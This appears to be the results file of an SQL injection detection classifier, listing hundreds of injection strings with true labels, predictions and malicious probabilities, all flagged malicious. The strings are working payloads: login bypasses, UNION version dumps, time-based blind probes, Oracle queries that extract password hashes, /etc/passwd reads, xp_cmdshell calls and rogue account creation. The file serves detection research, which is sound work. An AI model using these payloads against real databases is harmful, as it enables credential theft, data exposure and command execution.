Query,Label,predicted,correct,malicious_probability
" select * from users where id  =  1 or ""?  (  "" or 1  =  1 -- 1",1,1,True,0.9825221716703023
distinct,1,1,True,0.6614259586201033
select * from users where id  =  '1' *  (  \  )   or 1  =  1 -- 1',1,1,True,0.9985021127376741
"1 and ascii  (  lower  (  substring   (    (   select top 1 name from sysobjects where xtype  =  'u'  )  , 1, 1   )    )     )   > 116",1,1,True,0.6002169748276538
select * from users where id  =  1 or \.<\ or 1  =  1 -- 1,1,1,True,0.9857771924556555
"admin"" or ""1""  =  ""1""--",1,1,True,0.9999932495434539
" select * from users where id  =  1 or ""%{"" or 1  =  1 -- 1",1,1,True,0.9847119869353628
insert,1,1,True,0.7124110441928105
" select * from users where id  =  1 or 1#""?  =  1 or 1  =  1 -- 1",1,1,True,0.9862512015067836
" select * from users where id  =  1 or ""%?"" or 1  =  1 -- 1",1,1,True,0.9847119869353628
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  PASSWORD  )   FROM   (  SELECT DISTINCT  (  PASSWORD  )  , ROWNUM AS LIMIT FROM SYS.USER$  )   WHERE LIMIT  =  8   )    )    AND 'i'  =  'i",1,1,True,0.8977281946683463
" select * from users where id  =  1 or ""?#"" or 1  =  1 -- 1",1,1,True,0.9847119869353628
"or 1  =  1 or """"  =  ",1,1,True,0.8626182980284884
/**/or/**/1/**/  =  /**/1,1,1,True,0.9999413396037578
" select * from users where id  =  1 or "".  (  "" or 1  =  1 -- 1",1,1,True,0.9825221716703023
" select * from users where id  =  '1' union select ||/1,version  (    )   -- 1'",1,1,True,0.995210976304614
" select * from users where id  =  '1' union select +\.,@@VERSION -- 1'",1,1,True,0.9948302517273745
or 1  =  1/*,1,1,True,0.9875574483212368
%27 or 1  =  1,1,1,True,0.9528052967111278
" select * from users where id  =  1 <@&@ union select 1,version  (    )   -- 1",1,1,True,0.9698227451784087
" select * from users where id  =  '1' union select $*$,@@VERSION -- 1'",1,1,True,0.9950791686110021
"1;  (  load_file  (  char  (  47,101,116,99,47,112,97,115, ...",1,1,True,0.890938085612827
" select * from users where id  =  '1' or $ 1  =  1 union select 1,@@VERSION -- 1'",1,1,True,0.995678047484198
select * from users where id  =  1 or \.<1 or 1  =  1 -- 1,1,1,True,0.985369776424872
" select * from users where id  =  '1' or \<\ union select 1,@@VERSION -- 1'",1,1,True,0.9949391552003441
" select * from users where id  =  1 union select 1||1,version  (    )   -- 1",1,1,True,0.9716166975862705
" select * from users where id  =  1 ||1 union select null,banner from v$version where rownum  =  1 -- 1",1,1,True,0.978220507988779
select * from users where id  =  '1' or \.<\ or 1  =  1 -- 1',1,1,True,0.9984544945542554
" select * from users where id  =  1 or ""]{"" or 1  =  1 -- 1",1,1,True,0.9847119869353628
" select * from users where id  =  1 or "".@"" or 1  =  1 -- 1",1,1,True,0.9847119869353628
" select * from users where id  =  1 or ""$["" or 1  =  1 -- 1",1,1,True,0.9847119869353628
or 1 --',1,1,True,0.9999356923112811
" select * from users where id  =  1 or "",;"" or 1  =  1 -- 1",1,1,True,0.9847119869353628
"admin"" or 1  =  1#",1,1,True,0.9999738280189774
" select * from users where id  =  1 +  (  1  )   union select null,banner from v$version where rownum  =  1 -- 1",1,1,True,0.972299027534322
\x27UNION SELECT,1,1,True,0.9999961194188455
PRINT,1,1,True,0.8469691651689781
" select * from users where id  =  '1' union select   (  \.  )  ,@@VERSION -- 1'",1,1,True,0.9940108971482811
or 1  =  1--,1,1,True,0.998764683096716
1 or pg_sleep  (  __TIME__  )  --,1,1,True,0.993208681135252
" select * from users where id  =  1 or "",#"" or 1  =  1 -- 1",1,1,True,0.9847119869353628
admin'  )   or   (  '1'  =  '1'/*,1,1,True,0.9999995237894307
or 2 between 1 and 3,1,1,True,0.858130323055562
" select * from users where id  =  1 or ""  )  .""  =  1 or 1  =  1 -- 1",1,1,True,0.9819567623325716
" select * from users where id  =  1 or 1#"". union select null,version  (    )   -- 1",1,1,True,0.9695935350468594
admin' or '1'  =  '1,1,1,True,0.9999993730733896
; if not  (  select system_user  )   <> 'sa' waitfor delay '0:0:2' --,1,1,True,0.9568431556920812
" select * from users where id  =  1 union select 1,banner from v$version where rownum  =  1 -- 1",1,1,True,0.9788969672498994
""" or 0  =  0 --",1,1,True,0.9789535889522621
" select * from users where id  =  1 union select @ $_,version  (    )   -- 1",1,1,True,0.9685293350223131
select * from users where id  =  1 <@.$ or 1  =  1 -- 1,1,1,True,0.9883324458666042
" select * from users where id  =  1 or ""%."" or 1  =  1 -- 1",1,1,True,0.9847119869353628
" select * from users where id  =  1 + $+*$ union select null,@@VERSION -- 1",1,1,True,0.9656538071244696
" select * from users where id  =  1 or "",."" or 1  =  1 -- 1",1,1,True,0.9847119869353628
char%4039%41%2b%40SELECT,1,1,True,0.9427678653614668
" select * from users where id  =  1 or ""1&"" or 1  =  1 -- 1",1,1,True,0.9847119869353628
admin'  )   or   (  '1'  =  '1,1,1,True,0.9999990865433561
declare @s varchar   (  200  )   select @s   =   0x73656c6 ...,1,1,True,0.8091507767725679
"or 0  =  0 #""",1,1,True,0.9103231741347925
" select * from users where id  =  1 or "".]"" or 1  =  1 -- 1",1,1,True,0.9847119869353628
  )   or   (  'x'  =  'x,1,1,True,0.9910357065630306
" select * from users where id  =  1.<@$ union select 1,version  (    )   -- 1",1,1,True,0.9638245625961689
$  (  sleep 50  ) ,1,1,True,0.9503567920120675
" select * from users where id  =  1 *1 union select null,banner from v$version where rownum  =  1 -- 1",1,1,True,0.9766479982024344
"1 union all select 1,2,3,4,5,6,name from sysobjects where xtype   =   'u' --",1,1,True,0.9693783980340903
" select * from users where id  =  1 or 1#"". union select 'a',version  (    )   -- 1",1,1,True,0.9886231621455015
" select * from users where id  =  1 or 1#""; union select null,version  (    )   -- 1",1,1,True,0.9807523078952455
" select * from users where id  =  1 or 1#""? or 1  =  1 -- 1",1,1,True,0.9879044929364729
"""a"""" or 1  =  1--""",1,1,True,0.9968279568630027
" select * from users where id  =  1 *1 union select 1,banner from v$version where rownum  =  1 -- 1",1,1,True,0.9797748088509688
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  column_name  )   FROM   (  SELECT DISTINCT  (  column_name  )  , ROWNUM AS LIMIT FROM all_tab_columns  )   WHERE LIMIT  =  4   )    )    AND 'i'  =  'i",1,1,True,0.9553803254909149
" select * from users where id  =  '1' union select   (  \  )  ,@@VERSION -- 1'",1,1,True,0.9940108971482811
1 and user_name  (    )     =   'dbo',1,1,True,0.7394329204097851
"; if not  (  substring   (    (   select @@version  )  ,24,1  )   <> 1  )   waitfor delay '0:0:2' --",1,1,True,0.9913293336730185
" select * from users where id  =  1 or 1#""$ union select 1,version  (    )   -- 1",1,1,True,0.9743788616754852
" select * from users where id  =  1 or 1#""{ union select null,version  (    )   -- 1",1,1,True,0.9695935350468594
select * from users where id  =  '1' *$ . or 1  =  1 -- 1',1,1,True,0.9988553659265675
select * from users where id  =  1 +$+. or 1  =  1 -- 1,1,1,True,0.9880226288980315
select * from users where id  =  1 or   (  \+  )    =  1 or 1  =  1 -- 1,1,1,True,0.9799599568367612
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  USERNAME  )   FROM   (  SELECT DISTINCT  (  USERNAME  )  , ROWNUM AS LIMIT FROM SYS.ALL_USERS  )   WHERE LIMIT  =  6   )    )    AND 'i'  =  'i",1,1,True,0.9117516034118818
or 1  =  1 or ''  =  ',1,1,True,0.9637768202381372
select * from users where id  =  1   or 1  =  1 -- 1,1,1,True,0.9883614260985187
or 'text' > 't',1,1,True,0.8949121096840216
"1234 "" AND 1  =  0 UNION ALL SELECT ""admin"", ""81dc9bdb52d04dc20036dbd8313ed055",1,1,True,0.9999951637778911
" select * from users where id  =  1 or ""%["" or 1  =  1 -- 1",1,1,True,0.9847119869353628
" select * from users where id  =  1 or 1#"";  =  1 union select 1,version  (    )   -- 1",1,1,True,0.9832802803594132
admin' or '1'  =  '1'#,1,1,True,0.9999997432140382
select * from users where id  =  1 +$ 1 or 1  =  1 -- 1,1,1,True,0.9884769600941682
s,1,1,True,0.7703629730729482
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  USERNAME  )   FROM   (  SELECT DISTINCT  (  USERNAME  )  , ROWNUM AS LIMIT FROM SYS.ALL_USERS  )   WHERE LIMIT  =  4   )    )    AND 'i'  =  'i",1,1,True,0.9103176388476404
 select * from information_schema.tables--,1,1,True,0.9877672281328429
" select * from users where id  =  1 or ""$&"" or 1  =  1 -- 1",1,1,True,0.9847119869353628
1   )    )    or pg_sleep  (  __TIME__  )  --,1,1,True,0.9914676420161398
" select * from users where id  =  '1' union select !<@,version  (    )   -- 1'",1,1,True,0.9941947423552521
declare @q nvarchar   (  200  )   select @q   =   0x770061 ...,1,1,True,0.8565527627802852
 or 1  =  1 or ''  =  ',1,1,True,0.9551414180826701
select * from users where id  =  1 %!<1 or 1  =  1 -- 1,1,1,True,0.990257478513959
declare @q nvarchar   (  200  )   select @q   =   0x770061006900740066006F0072002000640065006C00610079002000270030003A0030003A0031003000270000 exec  (  @q  ) ,1,1,True,0.8477053779790745
" select * from users where id  =  1 or ""]1"" or 1  =  1 -- 1",1,1,True,0.9847119869353628
" select * from users where id  =  1 or $+<1 union select 1,@@VERSION -- 1",1,1,True,0.9734926977897445
or 'unusual'   =   'unusual',1,1,True,0.6785588132306485
 or 1 in   (  select @@version  )  --,1,1,True,0.9965733236933183
truncate,1,1,True,0.5190053667159022
as,1,1,True,0.8408990516142865
 or 3  =  3 --,1,1,True,0.9397127172952068
" select * from users where id  =  1 ||1 union select 1,banner from v$version where rownum  =  1 -- 1",1,1,True,0.9811281726450003
" select * from users where id  =  1 <@$$ union select 1,version  (    )   -- 1",1,1,True,0.9698227451784087
"admin""  )   or   (  ""1""  =  ""1",1,1,True,0.9998929330284151
" select * from users where id  =  1 or 1#""@ union select 'a',version  (    )   -- 1",1,1,True,0.9886231621455015
"1  )   or benchmark  (  10000000,MD5  (  1   )    )   #",1,1,True,0.9627359252358141
" select * from users where id  =  1 union select .1_,version  (    )   -- 1",1,1,True,0.9668568656226613
 AND 1  =  utl_inaddr.get_host_address   (    (   SELECT SYS.DATABASE_NAME FROM DUAL   )    )    AND 'i'  =  'i,1,1,True,0.9850197229393257
" or 0  =  0 #""",1,1,True,0.8970417444428724
select * from users where id  =  1 %$ 1 or 1  =  1 -- 1,1,1,True,0.9906033801305432
select * from users where id  =  1 %!<@ or 1  =  1 -- 1,1,1,True,0.990275848944219
"; if not  (  substring   (    (   select @@version  )  ,25,1  )   <> 0  )   waitfor delay '0:0:2' --",1,1,True,0.9915518220703045
1  )   or sleep  (  __TIME__  )  #,1,1,True,0.931066159405576
" select * from users where id  =  1 or ""1_"" or 1  =  1 -- 1",1,1,True,0.9847119869353628
" select * from users where id  =  1 <1## union select 1,version  (    )   -- 1",1,1,True,0.981229008960717
" select * from users where id  =  1 + $+*\ union select null,@@VERSION -- 1",1,1,True,0.9656538071244696
select * from users where id  =  1. <@ or 1  =  1 -- 1,1,1,True,0.9872720566732044
 or true--,1,1,True,0.9541833311872616
; execute immediate 'sel' || 'ect us' || 'er',1,1,True,0.933290134882182
hi' or 'x'  =  'x';,1,1,True,0.9983015103926304
select * from users where id  =  1 <@ or 1  =  1 -- 1,1,1,True,0.9883324458666042
" select * from users where id  =  1 or "".,"" or 1  =  1 -- 1",1,1,True,0.9847119869353628
admin' #,1,1,True,0.9999996714039089
" select * from users where id  =  1 <@$_ union select 1,version  (    )   -- 1",1,1,True,0.9698227451784087
" select * from users where id  =  1 or "",  (  "" or 1  =  1 -- 1",1,1,True,0.9820300845577336
" select * from users where id  =  1 or "",{"" or 1  =  1 -- 1",1,1,True,0.9847119869353628
" union select 1,load_file  (  '/etc/passwd'  )  ,1,1,1;",1,1,True,0.9401538627420961
"""  )  ;waitfor delay '0:0:__TIME__'--",1,1,True,0.9894264223634247
 or 'unusual'   =   'unusual',1,1,True,0.6684737591274343
"insert into mysql.user   (  user, host, password  )   values   (  'name', 'localhost', password  (  'pass123'   )    )   ",1,1,True,0.9194237662753587
"admin"" or ""1""  =  ""1""/*",1,1,True,0.9999898052024069
" select * from users where id  =  1 or ""1  (  ""  =  1 or 1  =  1 -- 1",1,1,True,0.9809630782361964
" select * from users where id  =  1 or \<1 union select 1,@@VERSION -- 1",1,1,True,0.9734926977897445
like,1,1,True,0.8157240918307682
or username like char  (  37  )  ;,1,1,True,0.8787305061458897
 )    )    or pg_sleep  (  __TIME__  )  --,1,1,True,0.990841542095549
select * from users where id  =  1 or $+<\ or 1  =  1 -- 1,1,1,True,0.9857771924556555
or 3  =  3,1,1,True,0.5541126121749202
" select * from users where id  =  1 or ""  (  ."" or 1  =  1 -- 1",1,1,True,0.9825221716703023
select * from users where id  =  1 or   (  $+  )    =  1 or 1  =  1 -- 1,1,1,True,0.9799599568367612
exec sp,1,1,True,0.6805302712266633
" select * from users where id  =  1 or \+<$ union select 1,@@VERSION -- 1",1,1,True,0.9713667926623787
select * from users where id  =  1 or \<$ or 1  =  1 -- 1,1,1,True,0.9857771924556555
" select * from users where id  =  1.&&1 union select 1,version  (    )   -- 1",1,1,True,0.9678661830903453
admin' or 1  =  1/*,1,1,True,0.9999965286724131
a' waitfor delay '0:0:10'--,1,1,True,0.9909552283199677
" select * from users where id  =  1 +  (  \  )   union select null,@@VERSION -- 1",1,1,True,0.9607988165000078
" select * from users where id  =  1 union select .1$_,version  (    )   -- 1",1,1,True,0.9668568656226613
and 1 in   (  select var from temp  )  --,1,1,True,0.9343012856081139
hi'  )   or   (  'a'  =  'a,1,1,True,0.9813986253984756
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  column_name  )   FROM   (  SELECT DISTINCT  (  column_name  )  , ROWNUM AS LIMIT FROM all_tab_columns  )   WHERE LIMIT  =  1   )    )    AND 'i'  =  'i",1,1,True,0.9602141769496311
"admin"" or 1  =  1",1,1,True,0.9999703144158997
"""  )   or true--",1,1,True,0.9388861946453024
" select * from users where id  =  '1' or $ .  =  1 union select 1,@@VERSION -- 1'",1,1,True,0.9950935058088568
" select * from users where id  =  1 or ""  (  {"" or 1  =  1 -- 1",1,1,True,0.9825221716703023
1  )   or pg_sleep  (  __TIME__  )  --,1,1,True,0.9920885647126587
" select * from users where id  =  1 or ""{."" or 1  =  1 -- 1",1,1,True,0.9847119869353628
"""  )   or sleep  (  __TIME__  )    =  """,1,1,True,0.8685726230919054
select * from users where id  =  1.<@. or 1  =  1 -- 1,1,1,True,0.9877419880019476
"admin""  )   or   (  ""1""  =  ""1""--",1,1,True,0.9999698002719339
" select * from users where id  =  1<@.. union select 1,version  (    )   -- 1",1,1,True,0.9649062125419433
; exec xp_regread,1,1,True,0.908831712164873
" select * from users where id  =  '1' + @ 1 union select 1,version  (    )   -- 1'",1,1,True,0.9952442335155722
select * from users where id  =  1 + \+%1 or 1  =  1 -- 1,1,1,True,0.986544002694047
" select * from users where id  =  1 or "";1"" or 1  =  1 -- 1",1,1,True,0.9847119869353628
" select * from users where id  =  1 or ""%&"" or 1  =  1 -- 1",1,1,True,0.9847119869353628
1 and 1  =  1,1,1,True,0.8942458963756581
or 0  =  0 #,1,1,True,0.9103231741347925
union select * from users where login   =   char ...,1,1,True,0.7181704771837006
" select * from users where id  =  1 union select 1||@,version  (    )   -- 1",1,1,True,0.9697189646039948
admin'  )   or '1'  =  '1'--,1,1,True,0.9999999270994255
1;SELECT *,1,1,True,0.9644062208616916
" select * from users where id  =  1 or ""{;"" or 1  =  1 -- 1",1,1,True,0.9847119869353628
x' and 1  =    (  select count  (  *  )   from tabname  )  ; --,1,1,True,0.9875590939686075
" select * from users where id  =  '1' or """"<@ union select 1,version  (    )   -- 1'",1,1,True,0.9940785411687129
" select * from users where id  =  1 or ""?,"" or 1  =  1 -- 1",1,1,True,0.9847119869353628
" select * from users where id  =  '1' ||1 union select 1,banner from v$version where rownum  =  1 -- 1'",1,1,True,0.9956609557608126
"1 or benchmark  (  10000000,MD5  (  1   )    )   #",1,1,True,0.9664674506248092
procedure,1,1,True,0.6313481875620048
or ''  =  ',1,1,True,0.9594060326791088
 AND 1  =  utl_inaddr.get_host_address   (    (   SELECT SYS.LOGIN_USER FROM DUAL   )    )    AND 'i'  =  'i,1,1,True,0.9768709207320319
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  USERNAME  )   FROM   (  SELECT DISTINCT  (  USERNAME  )  , ROWNUM AS LIMIT FROM SYS.ALL_USERS  )   WHERE LIMIT  =  2   )    )    AND 'i'  =  'i",1,1,True,0.912278616845565
\'; desc users; --,1,1,True,0.9994375420558729
" select * from users where id  =  1 or   (  \.  )    =  1 union select 1,@@VERSION -- 1",1,1,True,0.9669874680399221
select * from users where id  =  '1' or $ 1  =  1 or 1  =  1 -- 1',1,1,True,0.9982628382625702
""" or """"^""",1,1,True,0.695535719226054
"""-""",1,1,True,0.7703629730729482
" select * from users where id  =  1 or \<   =  1 union select 1,@@VERSION -- 1",1,1,True,0.9707117556722346
" select * from users where id  =  1 union select 1<@$,version  (    )   -- 1",1,1,True,0.9667523054643006
" select * from users where id  =  1 *\ union select null,@@VERSION -- 1",1,1,True,0.9693991919987897
" select * from users where id  =  '1' or !<@ union select 1,version  (    )   -- 1'",1,1,True,0.9940785411687129
" select * from users where id  =  1 or "".%"" or 1  =  1 -- 1",1,1,True,0.9847119869353628
admin'/*,1,1,True,0.9999997852939205
" select * from users where id  =  1 or ""  (  #"" or 1  =  1 -- 1",1,1,True,0.9859897263039299
||UTL_HTTP.REQUEST,1,1,True,0.8483413155759467
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  table_name  )   FROM   (  SELECT DISTINCT  (  table_name  )  , ROWNUM AS LIMIT FROM sys.all_tables  )   WHERE LIMIT  =  1   )    )    AND 'i'  =  'i",1,1,True,0.9417067590161775
" select * from users where id  =  '1'<@.. union select 1,version  (    )   -- 1'",1,1,True,0.992606053584445
"""   )    )    or benchmark  (  10000000,MD5  (  1   )    )   #",1,1,True,0.9608987060798687
" select * from users where id  =  1 <@.$ union select 1,version  (    )   -- 1",1,1,True,0.9698227451784087
" select * from users where id  =  1 or $ .  =  1 union select 1,@@VERSION -- 1",1,1,True,0.9710131438582379
select * from users where id  =  '1' <@.$ or 1  =  1 -- 1',1,1,True,0.9988157607922141
1 uni/**/on select all from where,1,1,True,0.9781230959224121
" select * from users where id  =  1 +$ . union select null,@@VERSION -- 1",1,1,True,0.9680114315974222
" select * from users where id  =  1 or 1#""? union select null,version  (    )   -- 1",1,1,True,0.9695935350468594
admin'  )   or '1'  =  '1'#,1,1,True,0.9999997816478771
||utl_http.request  (  'httP://192.168.1.1/'  )  ||',1,1,True,0.9071551092030186
or '7659'  =  '7659,1,1,True,0.6518030218891666
" select * from users where id  =  1 or ""{@"" or 1  =  1 -- 1",1,1,True,0.9847119869353628
" select * from users where id  =  1 union select +!<1,version  (    )   -- 1",1,1,True,0.9677334780033634
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  granted_role  )   FROM   (  SELECT DISTINCT  (  granted_role  )  , ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE  =  SYS.LOGINUSER  )   WHERE LIMIT  =  6   )    )    AND 'i'  =  'i",1,1,True,0.8478272332732977
" select * from users where id  =  1 or ""  (  @"" or 1  =  1 -- 1",1,1,True,0.9834996840097304
or true--,1,1,True,0.9790986928727309
" select * from users where id  =  1 union select !<1,version  (    )   -- 1",1,1,True,0.9688888464931831
" select * from users where id  =  '1' union select \#,@@VERSION -- 1'",1,1,True,0.9950791686110021
" select * from users where id  =  1 or 1#""{ union select 1,version  (    )   -- 1",1,1,True,0.9743788616754852
""" or true--",1,1,True,0.9541833311872616
select * from users where id  =  1. or 1  =  1 -- 1,1,1,True,0.9877419880019476
" select * from users where id  =  1 or @#"",  =  1 union select 1,version  (    )   -- 1",1,1,True,0.9677687524834654
" select * from users where id  =  1 or "";@"" or 1  =  1 -- 1",1,1,True,0.9847119869353628
â or 3  =  3 --,1,1,True,0.9397127172952068
 AND 1  =  utl_inaddr.get_host_address   (    (   SELECT global_name FROM global_name   )    )    AND 'i'  =  'i,1,1,True,0.9677482112924045
" select * from users where id  =  1 +1 union select null,banner from v$version where rownum  =  1 -- 1",1,1,True,0.9758257803376442
" select * from users where id  =  1 or "",,""  =  1 or 1  =  1 -- 1",1,1,True,0.9827768869403692
" select * from users where id  =  1 + $+%1 union select null,@@VERSION -- 1",1,1,True,0.9682345656980047
" select * from users where id  =  1 or 1#""? union select version  (    )  ,version  (    )   -- 1",1,1,True,0.9781929256214682
" select * from users where id  =  1 or ""  )  1"" or 1  =  1 -- 1",1,1,True,0.9843113115112615
 or uid like '%,1,1,True,0.718736247119634
select * from users where id  =  '1' <@&1 or 1  =  1 -- 1',1,1,True,0.9987925051468985
" select * from users where id  =  '1' union select !<1,version  (    )   -- 1'",1,1,True,0.9945471210312657
23 or 1  =  1; --,1,1,True,0.9976910864527423
" select * from users where id  =  1 or \<\. union select 1,@@VERSION -- 1",1,1,True,0.9713667926623787
" select * from users where id  =  1 or ""{  (  ""  =  1 or 1  =  1 -- 1",1,1,True,0.9804757019473969
" select * from users where id  =  1 or ""%_"" or 1  =  1 -- 1",1,1,True,0.9847119869353628
select * from users where id  =  1 +   (  \.  )   or 1  =  1 -- 1,1,1,True,0.9836060762434408
" select * from users where id  =  '1' union select \,@@VERSION -- 1'",1,1,True,0.9950791686110021
0 or 1  =  1,1,1,True,0.9256666008433486
select * from users where id  =  1 &@ or 1  =  1 -- 1,1,1,True,0.9887607138071924
"admin""  )   or ""1""  =  ""1",1,1,True,0.9999492055801068
select * from users where id  =  1 or \<   =  1 or 1  =  1 -- 1,1,1,True,0.9836372346984171
" select * from users where id  =  1 or ""??"" or 1  =  1 -- 1",1,1,True,0.9847119869353628
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  PASSWORD  )   FROM   (  SELECT DISTINCT  (  PASSWORD  )  , ROWNUM AS LIMIT FROM SYS.USER$  )   WHERE LIMIT  =  5   )    )    AND 'i'  =  'i",1,1,True,0.9104616075230337
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  column_name  )   FROM   (  SELECT DISTINCT  (  column_name  )  , ROWNUM AS LIMIT FROM all_tab_columns  )   WHERE LIMIT  =  7   )    )    AND 'i'  =  'i",1,1,True,0.9560528398836149
&apos; OR,1,1,True,0.990325006009308
sqlvuln;,1,1,True,0.7014929937302313
select * from users where id  =  1 + $+%$ or 1  =  1 -- 1,1,1,True,0.9864806583318763
select * from users where id  =  '1' + $+%\ or 1  =  1 -- 1',1,1,True,0.9985483122680217
""" or """"*""",1,1,True,0.695535719226054
"hi or 1  =  1 --""",1,1,True,0.9974287146174584
" select * from users where id  =  1. union select null,banner from v$version where rownum  =  1 -- 1",1,1,True,0.972815732944531
; exec master..xp_cmdshell 'ping 172.10.1.255'--,1,1,True,0.9790937921804677
" select * from users where id  =  '1' or 1^  =  1 union select 1,banner from v$version where rownum  =  1 -- 1'",1,1,True,0.9949356264493493
" select * from users where id  =  '1' union select ""?""_,version  (    )   -- 1'",1,1,True,0.9941947423552521
select * from information_schema.tables--,1,1,True,0.988426298433307
select * from users where id  =  1 or \<\. or 1  =  1 -- 1,1,1,True,0.9857771924556555
   (  select top 1,1,1,True,0.6269189546256908
Ã½ or 1  =  1 --,1,1,True,0.9977590770826128
a' --,1,1,True,0.9996521249087585
 or 1  =  1 /*,1,1,True,0.9889770448551028
" select * from users where id  =  1 or 1#"", union select null,version  (    )   -- 1",1,1,True,0.9687099484540532
" select * from users where id  =  '1' union select $ .,@@VERSION -- 1'",1,1,True,0.9950791686110021
--,1,1,True,0.9999990899569053
"exec sp_addlogin 'name' , 'password'",1,1,True,0.9629094583515077
" select * from users where id  =  1   union select null,banner from v$version where rownum  =  1 -- 1",1,1,True,0.9756193181393008
0x77616974666F722064656C61792027303A303A31302700 exec  (  @s  ) ,1,1,True,0.7660445068562586
" select * from users where id  =  1 or "".  )  "" or 1  =  1 -- 1",1,1,True,0.9839122405959937
" select * from users where id  =  1 or @<@  =  1 union select 1,version  (    )   -- 1",1,1,True,0.9684607304404953
group by userid having 1  =  1--,1,1,True,0.9760458627546511
" select * from users where id  =  1 + \+%1 union select null,@@VERSION -- 1",1,1,True,0.9682345656980047
select * from users where id  =  1 *1 or 1  =  1 -- 1,1,1,True,0.9887711837343782
" select * from users where id  =  1 or @#"";  =  1 or 1  =  1 -- 1",1,1,True,0.9904884175580002
‘ or 1  =  1 --,1,1,True,0.9977590770826128
" select * from users where id  =  1 *\. union select null,@@VERSION -- 1",1,1,True,0.9693991919987897
select * from users where id  =  1 %  (  @  )   or 1  =  1 -- 1,1,1,True,0.9887062569680615
or 'a'  =  'a,1,1,True,0.9911550705057397
declare @s varchar  (  22  )   select @s   = ,1,1,True,0.6602732414735693
" select * from users where id  =  1 union select 1<@,version  (    )   -- 1",1,1,True,0.9667523054643006
" select * from users where id  =  1 + \+*\ union select null,@@VERSION -- 1",1,1,True,0.9656538071244696
" select * from users where id  =  1 or 1#"". union select version  (    )  ,version  (    )   -- 1",1,1,True,0.9781929256214682
@variable,1,1,True,0.9255649731559995
; exec master..xp_cmdshell,1,1,True,0.9267354598223203
select * from users where id  =  1 +  (  1  )   or 1  =  1 -- 1,1,1,True,0.9839031764579372
" select * from users where id  =  1 union select @ 1$,version  (    )   -- 1",1,1,True,0.9697622712193904
" select * from users where id  =  1 union select @ 1a,version  (    )   -- 1",1,1,True,0.9697622712193904
